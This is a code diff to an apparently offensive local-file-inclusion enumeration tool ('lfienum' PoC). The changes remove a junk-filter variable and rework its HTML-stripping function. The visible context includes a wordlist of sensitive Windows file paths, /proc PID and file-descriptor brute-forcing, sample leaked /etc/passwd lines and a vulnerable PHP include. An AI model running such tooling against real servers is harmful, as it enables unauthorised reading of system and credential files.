@@ -3,6 +3,7 @@
 # lfienum (PoC) by 0bfxgh0st*
 
 import sys, requests, re, base64
+from bs4 import BeautifulSoup
 
 ColGreenMark="\033[1;32m"
 ColYellow="\033[0;33m"
@@ -67,42 +68,7 @@ def AdHelp():
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --key -vvv')
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --key --only-url')
 	print ('    python3 lfienum "http://ghost.server/index.php?page=" --key --only-url -vvv\n')
-	print ('[EXCLUDE VAR]\n')
-	print ("    exclude = '''''' (disabled by default, use it when output shows unwanted data)\n")
-	print ("---Get source code bad output----------------------")
-	print (ColYellow + '''<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<body>
-  /*
-</?php include $_GET['file']; */
-</body>
-</html>
-''' + ColEnd + '''
-
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
----------------------------------------------------\n''')
-	print ('Using exclude variable to clear junk data\n')
-	print ("""exclude = '''<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<body>
-  /*
-</?php include $_GET['file']; */
-</body>
-</html>'''""")
-
+	
 try:
 
 	if sys.argv[1] == '--help' or sys.argv[1] == '-h':
@@ -125,12 +91,6 @@ headers = {
 
     'User-Agent': '--'
 }
-
-exclude = ''''''
-
-if exclude != '':
-
-	print ('[' + ColRedMark + 'Exclude' + ColEnd + '] is enabled (debug/filtering mode)')
 
 try:
 
@@ -1240,13 +1200,19 @@ windows_lfi_wordlist=['C:/Users/Administrator/NTUser.dat',
 'c:/WINDOWS/system32/Macromed/Flash/FlashInstall.log',
 'c:/WINDOWS/system32/Macromed/Flash/install.log']
 
-def XCF():
+def XCF():                  # this function aims to print all text between tags (default)
 
 	global clean_content
 	content = resp.text
-	content = content.replace(exclude, '')
-	step = re.sub('<[^<]+?>', '', content)			
-	clean_content = step.strip()
+	out = re.sub('<[^<]+?>', '', content)			
+	clean_content = out.strip()
+
+#def XCF():                 # this function aims to print content between specific tags with the objective to avoid unwanted data
+
+#	global clean_content
+#	soup = BeautifulSoup(resp.content, 'html.parser')
+#	for i in soup.find_all(["p"]):
+#		clean_content = i.text
 
 def PackageStatus():
 
@@ -1342,7 +1308,7 @@ def PIDS():
 	
 		pid_count=999
 	
-	print ("Bruteforcing 0-" + str(pid_count) + " PIDS (please add junk data to exclude variable)\n")
+	print ("Bruteforcing 0-" + str(pid_count) + " PIDS\n")
 	for pid in range(pid_count+1):
 
 		global resp
@@ -1380,7 +1346,7 @@ def FD():
 
 		fd_count=30
 
-	print ("Bruteforcing 0-" + str(fd_count) + " /proc/self/fd/X (please add junk data to exclude variable)\n")
+	print ("Bruteforcing 0-" + str(fd_count) + " /proc/self/fd/X\n")
 	for fd in range(fd_count+1):
 
 		global resp
@@ -1427,7 +1393,7 @@ def Wrapper():
 	
 			except UnicodeDecodeError:
 	
-				print ('\n\n' + ColRedMark + 'Something went wrong while decoding base64. Junk data? Try decoding manually or add junk data to exclude variable' + ColEnd + '\n')
+				print ('\n\n' + ColRedMark + 'Something went wrong while decoding base64. Junk data? Try decoding manually or use other XCF function' + ColEnd + '\n')
 				sys.exit(1)
 	
 def IdRSA():
